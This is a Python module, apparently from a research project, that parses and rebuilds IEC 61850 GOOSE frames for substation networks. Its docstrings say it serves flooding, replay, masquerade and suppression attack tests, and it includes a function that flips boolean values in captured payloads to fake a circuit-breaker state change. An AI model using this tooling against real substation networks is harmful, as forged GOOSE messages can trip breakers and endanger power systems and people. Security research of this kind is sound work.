"""
goose_frame.py
Parser/builder de frames GOOSE (IEC 61850-8-1) usando Scapy + BER manual.

Estratégia: em vez de reimplementar toda a árvore ASN.1/MMS do bloco
'allData' (que é uma estrutura aninhada complexa e específica de cada
fabricante/IED), este módulo:
  1. Faz parse completo do cabeçalho GOOSE e dos campos escalares
     (gocbRef, timeAllowedToLive, datSet, goID, t, stNum, sqNum, test,
     confRev, ndsCom, numDatSetEntries).
  2. Trata o bloco 'allData' como um blob de bytes opaco, que pode ser
     reaproveitado de uma captura legítima (é isso que um atacante real
     faz: captura uma mensagem legítima e só mutila os campos que
     interessam — stNum, sqNum, t, ou bytes específicos já mapeados
     dentro do allData).

Isso é suficiente e realista para os 4 testes de ataque do artigo:
flooding, replay, masquerade/insertion e suppression.
"""

import struct
import time
from scapy.all import Ether, Dot1Q, Raw, sendp, sniff

GOOSE_ETHERTYPE = 0x88B8
SV_ETHERTYPE = 0x88BA

# tag -> nome do campo escalar do GOOSE PDU (todos primitivos, classe
# context-specific => byte de tag = 0x80 | numero_do_campo)
FIELD_TAGS = {
    0x80: "gocbRef",
    0x81: "timeAllowedToLive",
    0x82: "datSet",
    0x83: "goID",
    0x84: "t",
    0x85: "stNum",
    0x86: "sqNum",
    0x87: "test",
    0x88: "confRev",
    0x89: "ndsCom",
    0x8A: "numDatSetEntries",
}
ALLDATA_TAG = 0xAB
GOOSE_PDU_TAG = 0x61


def _read_ber_length(data, offset):
    """Lê um campo de comprimento BER (forma curta ou longa).
    Retorna (comprimento, novo_offset)."""
    first = data[offset]
    offset += 1
    if first < 0x80:
        return first, offset
    num_bytes = first & 0x7F
    length = int.from_bytes(data[offset:offset + num_bytes], "big")
    offset += num_bytes
    return length, offset


def _encode_ber_length(length):
    if length < 0x80:
        return bytes([length])
    body = length.to_bytes((length.bit_length() + 7) // 8, "big")
    return bytes([0x80 | len(body)]) + body


def _int_to_min_bytes(n, signed=False):
    """Codifica inteiro no menor número de bytes (como o BER INTEGER
    exige), igual ao observado nas capturas reais (ex: stNum=0x17 em
    1 byte, sqNum=0x0209 em 2 bytes)."""
    if n == 0:
        return b"\x00"
    nbytes = max(1, (n.bit_length() + 7) // 8)
    # garante bit de sinal 0 se não for 'signed' e o MSB já ocupar o bit 7
    b = n.to_bytes(nbytes, "big", signed=False)
    if not signed and b[0] & 0x80:
        b = b"\x00" + b
    return b


def parse_goose_pdu(pdu_bytes):
    """Faz parse do PDU GOOSE (dentro da tag APPLICATION 1 / 0x61).
    pdu_bytes = conteúdo já sem a tag 0x61 e seu length (só os campos)."""
    fields = {}
    offset = 0
    while offset < len(pdu_bytes):
        tag = pdu_bytes[offset]
        offset += 1
        length, offset = _read_ber_length(pdu_bytes, offset)
        value = pdu_bytes[offset:offset + length]
        offset += length

        if tag in FIELD_TAGS:
            name = FIELD_TAGS[tag]
            if name in ("gocbRef", "datSet", "goID"):
                fields[name] = value.decode("ascii", errors="replace")
            elif name in ("stNum", "sqNum", "timeAllowedToLive", "confRev",
                          "numDatSetEntries"):
                fields[name] = int.from_bytes(value, "big")
            elif name in ("test", "ndsCom"):
                fields[name] = bool(value[0])
            elif name == "t":
                fields[name] = value  # 8 bytes crus (seg+fração+qualidade)
        elif tag == ALLDATA_TAG:
            fields["allData"] = value  # blob opaco, ver docstring do módulo
        else:
            fields.setdefault("_unknown", []).append((hex(tag), value))
    return fields


def build_goose_pdu(fields):
    """Reconstrói os bytes do PDU GOOSE (sem a tag 0x61/length externos)
    a partir do dicionário de campos (mesmo formato retornado por
    parse_goose_pdu)."""
    out = b""

    def emit(tag, value_bytes):
        return bytes([tag]) + _encode_ber_length(len(value_bytes)) + value_bytes

    out += emit(0x80, fields["gocbRef"].encode("ascii"))
    out += emit(0x81, _int_to_min_bytes(fields["timeAllowedToLive"]))
    out += emit(0x82, fields["datSet"].encode("ascii"))
    out += emit(0x83, fields["goID"].encode("ascii"))
    out += emit(0x84, fields["t"])
    out += emit(0x85, _int_to_min_bytes(fields["stNum"]))
    out += emit(0x86, _int_to_min_bytes(fields["sqNum"]))
    out += emit(0x87, b"\x01" if fields["test"] else b"\x00")
    out += emit(0x88, _int_to_min_bytes(fields["confRev"]))
    out += emit(0x89, b"\x01" if fields["ndsCom"] else b"\x00")
    out += emit(0x8A, _int_to_min_bytes(fields["numDatSetEntries"]))
    out += emit(ALLDATA_TAG, fields["allData"])
    return out


def make_utctime(ts=None):
    """Codifica um timestamp no formato UtcTime da IEC 61850:
    4 bytes segundos desde epoch + 3 bytes fração de segundo (24 bits)
    + 1 byte de qualidade/flags de leap-second."""
    if ts is None:
        ts = time.time()
    seconds = int(ts)
    frac = ts - seconds
    frac_int = int(frac * (1 << 24)) & 0xFFFFFF
    quality = 0x0A  # bits reservados/qualidade; valor observado em capturas reais
    return struct.pack("!I", seconds) + frac_int.to_bytes(3, "big") + bytes([quality])


def flip_boolean_in_data(all_data_bytes, occurrence=0, tag=0x83, new_value=None):
    """Localiza a N-ésima ocorrência de um valor booleano de 1 byte
    (tag context-specific length=1, ex: 0x83 0x01 <valor>) dentro do
    blob 'allData' e inverte (ou fixa) seu valor.

    Usado no ataque de masquerade/insertion (Teste C): permite simular,
    por exemplo, a mudança de estado de um disjuntor (0->1) sem precisar
    reimplementar toda a árvore MMS Data.

    Retorna (novo_blob, offset_alterado, valor_antigo, valor_novo).
    Lança ValueError se a ocorrência não existir.
    """
    import re
    pattern = re.compile(bytes([tag, 0x01]) + b"(.)", flags=re.DOTALL)
    matches = list(pattern.finditer(all_data_bytes))
    if occurrence >= len(matches):
        raise ValueError(
            f"Só existem {len(matches)} ocorrências da tag {hex(tag)} "
            f"len=1 em allData; pedida ocorrência {occurrence}."
        )
    m = matches[occurrence]
    old_value = m.group(1)[0]
    value = (1 - old_value) if new_value is None else new_value
    value_offset = m.start(1)
    new_blob = (
        all_data_bytes[:value_offset]
        + bytes([value])
        + all_data_bytes[value_offset + 1:]
    )
    return new_blob, value_offset, old_value, value


def parse_ethernet_goose(raw_bytes):
    """Faz parse de um frame Ethernet cru contendo GOOSE (com ou sem
    tag 802.1Q). Retorna um dict com endereços, VLAN, cabeçalho GOOSE
    e os campos do PDU."""
    dst_mac = raw_bytes[0:6]
    src_mac = raw_bytes[6:12]
    offset = 12
    vlan = None
    ethertype = int.from_bytes(raw_bytes[offset:offset + 2], "big")
    offset += 2
    if ethertype == 0x8100:
        tci = int.from_bytes(raw_bytes[offset:offset + 2], "big")
        vlan = {"priority": (tci >> 13) & 0x7, "id": tci & 0xFFF}
        offset += 2
        ethertype = int.from_bytes(raw_bytes[offset:offset + 2], "big")
        offset += 2

    if ethertype != GOOSE_ETHERTYPE:
        raise ValueError(f"Não é um frame GOOSE (ethertype={hex(ethertype)})")

    appid = int.from_bytes(raw_bytes[offset:offset + 2], "big")
    goose_len = int.from_bytes(raw_bytes[offset + 2:offset + 4], "big")
    # reserved1/reserved2 = raw_bytes[offset+4:offset+8]
    pdu_start = offset + 8

    pdu_tag = raw_bytes[pdu_start]
    assert pdu_tag == GOOSE_PDU_TAG, f"Tag de PDU inesperada: {hex(pdu_tag)}"
    pdu_len, pdu_data_start = _read_ber_length(raw_bytes, pdu_start + 1)
    pdu_bytes = raw_bytes[pdu_data_start:pdu_data_start + pdu_len]

    fields = parse_goose_pdu(pdu_bytes)

    return {
        "dst_mac": ":".join(f"{b:02x}" for b in dst_mac),
        "src_mac": ":".join(f"{b:02x}" for b in src_mac),
        "vlan": vlan,
        "appid": appid,
        "declared_length": goose_len,
        "fields": fields,
    }


def build_ethernet_goose_frame(dst_mac, src_mac, appid, fields, vlan_id=None,
                                vlan_priority=4):
    """Monta um frame Ethernet+GOOSE completo pronto para envio via Scapy
    (sendp). fields = dict no formato de parse_goose_pdu/build_goose_pdu."""
    pdu_bytes = build_goose_pdu(fields)
    pdu_tlv = bytes([GOOSE_PDU_TAG]) + _encode_ber_length(len(pdu_bytes)) + pdu_bytes

    goose_header = struct.pack("!HHHH", appid, 8 + len(pdu_tlv), 0, 0)
    payload = goose_header + pdu_tlv

    pkt = Ether(dst=dst_mac, src=src_mac)
    if vlan_id is not None:
        pkt = pkt / Dot1Q(vlan=vlan_id, prio=vlan_priority)
    pkt = pkt / Raw(load=payload)
    # o ethertype do GOOSE precisa ficar no campo 'type' da última camada L2
    if vlan_id is not None:
        pkt[Dot1Q].type = GOOSE_ETHERTYPE
    else:
        pkt[Ether].type = GOOSE_ETHERTYPE
    return pkt
